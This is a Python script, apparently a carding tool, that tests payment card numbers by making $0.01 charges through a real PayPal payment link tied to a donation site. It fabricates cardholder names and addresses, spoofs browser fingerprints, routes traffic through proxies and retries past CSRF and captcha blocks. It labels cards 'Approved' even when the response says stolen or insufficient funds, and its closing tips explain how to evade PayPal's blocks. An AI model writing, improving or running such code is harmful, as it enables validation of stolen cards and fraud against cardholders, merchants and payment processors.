"""
PayPal $0.01 Checker - Standalone Version for Pydroid
Fixed CSRF Error with improved token extraction and retry logic
Added proxy support and anti-detection
"""

import re
import json
import random
import uuid
import time

# Try to import curl_cffi first (best for anti-detection)
try:
    from curl_cffi import requests as curl_requests
    HAS_CURL_CFFI = True
except ImportError:
    HAS_CURL_CFFI = False

# Fallback to cloudscraper
try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

# Final fallback to regular requests
import requests

# Try to import optional dependencies
try:
    from faker import Faker
    HAS_FAKER = True
except ImportError:
    HAS_FAKER = False

try:
    from fake_useragent import UserAgent
    HAS_UA = True
except ImportError:
    HAS_UA = False

# Print available modules
print("[*] Anti-detection modules:")
print(f"    - curl_cffi: {'✓' if HAS_CURL_CFFI else '✗ (pip install curl_cffi)'}")
print(f"    - cloudscraper: {'✓' if HAS_CLOUDSCRAPER else '✗ (pip install cloudscraper)'}")
print(f"    - faker: {'✓' if HAS_FAKER else '✗ (optional)'}")
print()


class PaypalGate:
    """Paypal $0.01 Charge Gate - Fixed CSRF Version with Anti-Detection"""
    
    def __init__(self, proxy=None):
        self.proxy = proxy
        self.use_curl_cffi = False
        self.use_cloudscraper = False
        
        # Chrome versions for realistic user agents
        chrome_versions = ['120.0.0.0', '121.0.0.0', '122.0.0.0', '123.0.0.0', '124.0.0.0', '125.0.0.0', '126.0.0.0', '127.0.0.0', '128.0.0.0', '129.0.0.0', '130.0.0.0', '131.0.0.0']
        
        # Random user agent
        if HAS_UA:
            try:
                ua = UserAgent()
                self.user_agent = ua.random
            except:
                cv = random.choice(chrome_versions)
                self.user_agent = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cv} Safari/537.36'
        else:
            cv = random.choice(chrome_versions)
            self.user_agent = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cv} Safari/537.36'
        
        # Initialize session with best available method
        if HAS_CURL_CFFI:
            # Best option - mimics Chrome TLS fingerprint
            self.s = curl_requests.Session(impersonate="chrome120")
            self.use_curl_cffi = True
            if proxy:
                self.s.proxies = {'http': proxy, 'https': proxy}
        elif HAS_CLOUDSCRAPER:
            # Good option - bypasses basic bot detection
            self.s = cloudscraper.create_scraper(
                browser={
                    'browser': 'chrome',
                    'platform': 'windows',
                    'mobile': False
                }
            )
            self.use_cloudscraper = True
            if proxy:
                self.s.proxies = {'http': proxy, 'https': proxy}
        else:
            # Fallback - regular requests
            self.s = requests.Session()
            if proxy:
                self.s.proxies = {'http': proxy, 'https': proxy}
        
        # Initialize Faker
        if HAS_FAKER:
            self.fake = Faker('en_US')
        else:
            self.fake = None
    
    def generate_fake_data(self):
        """Generate fake user data"""
        if self.fake:
            first_name = self.fake.first_name()
            last_name = self.fake.last_name()
            address_1 = self.fake.street_address()
            email = self.fake.email(domain='gmail.com')
        else:
            # Fallback random data
            first_names = ['John', 'Jane', 'Mike', 'Sarah', 'David', 'Emily', 'Chris', 'Lisa']
            last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Davis', 'Miller']
            first_name = random.choice(first_names)
            last_name = random.choice(last_names)
            address_1 = f"{random.randint(100, 9999)} {random.choice(['Main', 'Oak', 'Pine', 'Maple'])} St"
            email = f"{first_name.lower()}{random.randint(100,999)}@gmail.com"
        
        return first_name, last_name, address_1, email
    
    def extract_csrf_token(self, html_text):
        """Extract CSRF token using multiple patterns - FIXED"""
        # Multiple patterns to handle different PayPal page formats
        patterns = [
            r'csrfToken["\']?\s*:\s*["\']([^"\']+)["\']',
            r'"csrfToken"\s*:\s*"([^"]+)"',
            r"'csrfToken'\s*:\s*'([^']+)'",
            r'csrf[Tt]oken["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]+)["\']',
            r'name="csrf_token"\s+value="([^"]+)"',
            r'data-csrf="([^"]+)"',
            r'"csrf"\s*:\s*"([^"]+)"',
            r'_csrf["\']?\s*:\s*["\']([^"\']+)["\']',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_text)
            if match:
                return match.group(1)
        return None

    def check_card(self, cc, mm, yy, cvv):
        """Full Paypal $0.01 charge check - FIXED CSRF"""
        try:
            # Generate fake data
            first_name, last_name, address_1, email = self.generate_fake_data()
            
            ny_postcodes = [
                "10001", "10002", "10003", "10004", "10005", "10006", "10007", "10009", "10010",
                "10011", "10012", "10013", "10014", "10016", "10017", "10018", "10019", "10020",
                "10021", "10022", "10023", "10024", "10025", "10026", "10027", "10028", "10029",
                "10030", "10031", "10032", "10033", "10034", "10035", "10036", "10037", "10038",
                "10039", "10040", "10044", "10065", "10069", "10075", "10128", "10280", "10282"
            ]
            postcode = random.choice(ny_postcodes)
            phone = f"{random.randint(1000000, 9999999)}"
            
            session_id = f"uid_{uuid.uuid4().hex[:16]}_{uuid.uuid4().hex[:10]}"
            button_id = f"uid_{uuid.uuid4().hex[:16]}_{uuid.uuid4().hex[:10]}"
            
            # Card type detection
            cc_type = "VISA" if cc.startswith('4') else "MASTER_CARD" if cc.startswith('5') else "DISCOVER" if cc.startswith('6') else "AMERICAN_EXPRESS" if cc.startswith('3') else "VISA"
            
            # Format month
            mm = mm.zfill(2)
            
            # Format year
            if len(yy) == 2:
                yy = f'20{yy}'
            
            # Step 1: Warm up session with proper browser-like headers
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': self.user_agent,
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Cache-Control': 'max-age=0',
            }
            
            # Visit donation page to get cookies
            self.s.get('https://lpcenter.org/give/', headers=headers, timeout=30)
            
            # Step 2: Visit PayPal payment page with retry mechanism
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://lpcenter.org/',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': self.user_agent,
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-User': '?1',
                'Cache-Control': 'max-age=0',
            }
            
            csrf_token = None
            max_retries = 3
            
            for attempt in range(max_retries):
                response = self.s.get('https://www.paypal.com/ncp/payment/BKVC4EKUZY9K2', headers=headers, timeout=30)
                
                # Check if blocked or captcha page
                resp_lower = response.text.lower()
                is_blocked = (
                    'captcha' in resp_lower or 
                    'blocked' in resp_lower or
                    'security challenge' in resp_lower or
                    'unusual activity' in resp_lower or
                    'verify you' in resp_lower or
                    'robot' in resp_lower or
                    'automated' in resp_lower or
                    len(response.text) < 1000  # Too short = likely blocked
                )
                
                if is_blocked and 'csrfToken' not in response.text:
                    if attempt < max_retries - 1:
                        time.sleep(2)  # Wait longer
                        continue
                    return "Declined ❌", "Blocked by PayPal"
                
                csrf_token = self.extract_csrf_token(response.text)
                if csrf_token:
                    break
                
                # Try alternative extraction from script tags
                script_match = re.search(r'<script[^>]*>([^<]*csrfToken[^<]*)</script>', response.text, re.IGNORECASE)
                if script_match:
                    csrf_token = self.extract_csrf_token(script_match.group(1))
                    if csrf_token:
                        break
                
                if attempt < max_retries - 1:
                    time.sleep(0.5)
            
            if not csrf_token:
                return "Declined ❌", "CSRF Token Not Found"
            
            # Step 3: Create order with improved headers
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/json',
                'Origin': 'https://www.paypal.com',
                'Referer': 'https://www.paypal.com/ncp/payment/BKVC4EKUZY9K2',
                'User-Agent': self.user_agent,
                'X-Csrf-Token': csrf_token,
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
            }
            
            json_data = {
                'link_id': 'BKVC4EKUZY9K2',
                'merchant_id': 'ZDZWVC4R4XCGQ',
                'quantity': '1',
                'amount': '0.01',
                'currency': 'USD',
                'currencySymbol': '$',
                'funding_source': 'CARD',
                'button_type': 'VARIABLE_PRICE',
                'csrfRetryEnabled': True,
            }
            
            order_data = None
            csrf_retry_count = 0
            max_csrf_retries = 3
            
            while csrf_retry_count < max_csrf_retries:
                response = self.s.post('https://www.paypal.com/ncp/api/create-order', headers=headers, json=json_data, timeout=30)
                
                try:
                    order_data = response.json()
                except:
                    return "Declined ❌", "Invalid Response"
                
                # Handle CSRF mismatch with retry
                if order_data.get('message') == 'CSRF_MISMATCH_RETRY' or order_data.get('error') == 'CSRF_MISMATCH':
                    new_csrf = order_data.get('csrfToken')
                    if new_csrf:
                        csrf_token = new_csrf
                        headers['X-Csrf-Token'] = csrf_token
                        csrf_retry_count += 1
                        continue
                    else:
                        return "Declined ❌", "CSRF Mismatch"
                
                # Check for other CSRF errors
                if 'csrf' in str(order_data).lower() and 'context_id' not in order_data:
                    csrf_retry_count += 1
                    time.sleep(0.3)
                    continue
                
                break
            
            if not order_data or 'context_id' not in order_data:
                error_msg = order_data.get('message', order_data.get('error', 'Order Error'))
                if isinstance(error_msg, dict):
                    error_msg = 'Order Error'
                return "Declined ❌", str(error_msg)[:30]
            
            order_token = order_data['context_id']
            csrf_token = order_data.get('csrfToken', csrf_token)
            
            # Step 4: Pay with card - improved headers
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/json',
                'Origin': 'https://www.paypal.com',
                'Paypal-Client-Context': order_token,
                'Paypal-Client-Metadata-Id': order_token,
                'Priority': 'u=1, i',
                'Referer': f'https://www.paypal.com/smart/card-fields?token={order_token}&sessionID={session_id}&buttonSessionID={button_id}&locale.x=en_US&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVhJOXVmRTBTMmNiRlhFaTcxa0hSdTlNYVFiTjAxVVlQdVFpZEp4akVfdDAwWWs2TmRTcjBqb1hodDRaM05Odnc2cGpaU0NxRy1wOTlGWlMmbWVyY2hhbnQtaWQ9WkRaV1ZDNFI0WENHUSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlzaWJpbGl0eSZjdXJyZW5jeT1VU0QmbG9jYWxlPWVuX1VTJmVuYWJsZS1mdW5kaW5nPXZlbm1vLHBheWxhdGVyIiwiYXR0cnMiOnsiZGF0YS1jc3Atbm9uY2UiOiJmOEY5OEpiUUJhcUEvR3dVc2pub0JJQ2tkNURFODVhaDE2UjRWNHc5YWxxS3I1aXgiLCJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXVpZCI6InVpZF9nbXVkdHBsc2dtb2JycHp4YmNrcWlsdnZmYm50amsifX0&disable-card=',
                'User-Agent': self.user_agent,
                'X-App-Name': 'standardcardfields',
                'X-Country': 'US',
                'X-Csrf-Token': csrf_token,
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
            }
            
            # GraphQL mutation
            json_data = {
                'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
                'variables': {
                    'token': order_token,
                    'card': {
                        'cardNumber': cc,
                        'type': cc_type,
                        'expirationDate': f'{mm}/{yy}',
                        'postalCode': postcode,
                        'securityCode': cvv,
                    },
                    'phoneNumber': phone,
                    'firstName': first_name,
                    'lastName': last_name,
                    'billingAddress': {
                        'givenName': first_name,
                        'familyName': last_name,
                        'line1': address_1,
                        'line2': None,
                        'city': 'New York',
                        'state': 'NY',
                        'postalCode': postcode,
                        'country': 'US',
                    },
                    'shippingAddress': {
                        'givenName': first_name,
                        'familyName': last_name,
                        'line1': address_1,
                        'line2': None,
                        'city': 'New York',
                        'state': 'NY',
                        'postalCode': postcode,
                        'country': 'US',
                    },
                    'email': email,
                    'currencyConversionType': 'PAYPAL',
                },
                'operationName': None,
            }
            
            response = self.s.post(
                'https://www.paypal.com/graphql?fetch_credit_form_submit',
                headers=headers,
                json=json_data,
                timeout=30
            )
            
            response_text = response.text
            
            # Parse response
            if 'errors' in response_text:
                jsonresponse = response.json()
                try:
                    code = jsonresponse['errors'][0]['data'][0]['code']
                except (KeyError, IndexError, TypeError):
                    code = None
                
                try:
                    message = jsonresponse['errors'][0]['message']
                except (KeyError, IndexError):
                    message = 'Unknown'
                
                if code:
                    # CVV/Security code errors = Approved (CCN)
                    if "INVALID_SECURITY_CODE" in code or "CVV" in code.upper() or "CVC" in code.upper():
                        return "Approved ✅", code
                    # Expired card = Declined
                    elif "EXPIRED" in code.upper():
                        return "Declined ❌", code
                    # Invalid/Incorrect number = Declined
                    elif "INVALID_CARD" in code.upper() or "INCORRECT" in code.upper() or "INVALID_NUMBER" in code.upper():
                        return "Declined ❌", code
                    # Validation errors = Approved
                    elif "VALIDATION_ERROR" in code or "OAS_VALIDATION_ERROR" in code:
                        return "Approved ✅", code
                    # Account restricted = Approved
                    elif "EXISTING_ACCOUNT_RESTRICTED" in code:
                        return "Approved ✅", code
                    # Card declined = Declined
                    elif "DECLINED" in code.upper() or "DENY" in code.upper():
                        return "Declined ❌", code
                    # Insufficient funds = Approved
                    elif "INSUFFICIENT" in code.upper():
                        return "Approved ✅", code
                    # Do not honor = Approved
                    elif "DO_NOT_HONOR" in code.upper():
                        return "Approved ✅", code
                    # Lost/Stolen = Approved
                    elif "LOST" in code.upper() or "STOLEN" in code.upper():
                        return "Approved ✅", code
                    else:
                        return "Declined ❌", code
                else:
                    # Check message for clues
                    msg_upper = message.upper()
                    if "CVV" in msg_upper or "CVC" in msg_upper or "SECURITY CODE" in msg_upper:
                        return "Approved ✅", message[:40]
                    elif "EXPIRED" in msg_upper:
                        return "Declined ❌", message[:40]
                    elif "INVALID" in msg_upper or "INCORRECT" in msg_upper:
                        return "Declined ❌", message[:40]
                    else:
                        return "Declined ❌", message[:40]
            
            elif 'is3DSecureRequired' in response_text:
                jsonresponse = response.json()
                is_3ds_required = (jsonresponse.get('data', {})
                                    .get('approveGuestPaymentWithCreditCard', {})
                                    .get('flags', {})
                                    .get('is3DSecureRequired', False))
                
                if is_3ds_required == True:
                    return "Approved ✅", "3D Secure Required"
                else:
                    return "Charged $0.01 💎", "Charged $0.01"
            
            else:
                return "Declined ❌", "Unknown Response"
                
        except requests.exceptions.Timeout:
            return "Declined ❌", "Timeout"
        except requests.exceptions.ProxyError:
            return "Declined ❌", "Proxy Error"
        except Exception as e:
            return "Declined ❌", str(e)[:40]


def check_paypal(cc, mm, yy, cvv, proxy=None):
    """Full Paypal check"""
    gate = PaypalGate(proxy=proxy)
    return gate.check_card(cc, mm, yy, cvv)


def extract_card(text):
    """Extract card details from text"""
    match = re.search(r'(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', text)
    if match:
        return match.groups()
    return None


def parse_proxy(proxy_str):
    """Convert various proxy formats to http://user:pass@host:port"""
    if not proxy_str:
        return None
    
    proxy_str = proxy_str.strip()
    
    # Already in correct format
    if proxy_str.startswith('http://') or proxy_str.startswith('https://'):
        return proxy_str
    
    # Format: host:port:user:pass
    if proxy_str.count(':') == 3:
        parts = proxy_str.split(':')
        host, port, user, pwd = parts[0], parts[1], parts[2], parts[3]
        return f"http://{user}:{pwd}@{host}:{port}"
    
    # Format: user:pass@host:port (missing http://)
    if '@' in proxy_str:
        return f"http://{proxy_str}"
    
    # Format: host:port (no auth)
    if proxy_str.count(':') == 1:
        return f"http://{proxy_str}"
    
    # Format: user:pass:host:port
    if proxy_str.count(':') == 3:
        parts = proxy_str.split(':')
        user, pwd, host, port = parts[0], parts[1], parts[2], parts[3]
        return f"http://{user}:{pwd}@{host}:{port}"
    
    return proxy_str


def main():
    print("=" * 50)
    print("  PayPal $0.01 Checker - CSRF Fixed Version")
    print("         + Anti-Detection + Proxy Support")
    print("=" * 50)
    print()
    
    # Get proxy input (optional)
    print("[?] Proxy helps avoid PayPal blocks")
    print("    Formats accepted:")
    print("    - host:port:user:pass")
    print("    - http://user:pass@host:port")
    print("    - user:pass@host:port")
    print("    - host:port")
    proxy_input = input("Enter Proxy (or press Enter to skip): ").strip()
    proxy = parse_proxy(proxy_input)
    
    if proxy:
        # Hide credentials in display
        display_proxy = proxy
        if '@' in proxy:
            parts = proxy.split('@')
            display_proxy = f"http://***:***@{parts[1]}"
        print(f"[*] Using proxy: {display_proxy}")
    else:
        print("[!] No proxy - may get blocked by PayPal")
    print()
    
    # Get card input
    card_input = input("Enter CC (format: cc|mm|yy|cvv): ").strip()
    
    # Extract card details
    extracted = extract_card(card_input)
    if not extracted:
        print("\n❌ Invalid format! Use: 4111111111111111|12|25|123")
        return
    
    cc, mm, yy, cvv = extracted
    fullcc = f"{cc}|{mm}|{yy}|{cvv}"
    
    print(f"\n[*] Card: {fullcc}")
    print("[*] Gateway: PayPal $0.01")
    if HAS_CURL_CFFI:
        print("[*] Mode: curl_cffi (Chrome TLS)")
    elif HAS_CLOUDSCRAPER:
        print("[*] Mode: cloudscraper")
    else:
        print("[*] Mode: requests (basic)")
    print("[*] Processing...\n")
    
    start_time = time.time()
    
    # Check the card
    status, response = check_paypal(cc, mm, yy, cvv, proxy)
    
    end_time = time.time()
    timetaken = round(end_time - start_time, 2)
    
    # Print result
    print("=" * 50)
    print(f"[#Paypal] | Result")
    print("=" * 50)
    print(f"[•] Card: {fullcc}")
    print(f"[•] Gateway: PayPal $0.01")
    print(f"[•] Status: {status}")
    print(f"[•] Response: {response}")
    print(f"[•] Time: {timetaken}s")
    print("=" * 50)
    
    # Tips if blocked
    if "Blocked" in response or "CSRF" in response:
        print()
        print("[!] TIPS to fix blocks:")
        print("    1. Use a proxy (residential/mobile best)")
        print("    2. Install: pip install curl_cffi")
        print("    3. Install: pip install cloudscraper")
        print("    4. Wait a few minutes and try again")


if __name__ == "__main__":
    main()
